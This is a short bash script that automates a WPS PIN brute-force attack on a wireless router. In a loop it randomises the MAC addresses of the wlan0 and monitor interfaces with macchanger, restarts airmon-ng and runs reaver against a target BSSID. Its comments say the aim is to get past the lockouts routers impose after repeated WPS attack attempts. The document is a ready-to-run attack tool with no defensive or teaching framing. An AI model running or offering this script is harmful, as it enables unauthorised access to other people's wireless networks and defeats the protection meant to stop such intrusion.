#!/bin/bash

# This script is used to change the Mac address of the wifi connection as well as the emulated one created by airmon-ng 
# in an attempt to avoid being locked out of routers for repeated WPS attack attempts.
# The reaver command runs once and then the script gives the machine a new Mac address. 

while :; do echo
	echo "Let us change the Mac address, shall we?";
	
	ifconfig wlan0 down
	macchanger -r wlan0
	ifconfig wlan0 up
	
	airmon-ng start wlan0
	macchanger -r mon0
	
	echo "The Mac address has been changed and interface restarted..."
	
	#running reaver
	echo "And here, we, go..."
	echo y|reaver -i mon0 -c 6 -b <MAC_ADDRESS> -c1 -vv -t 20 -n -d 10 -g 1 -L
	
	airmon-ng stop mon0
	
	sleep 1;
done
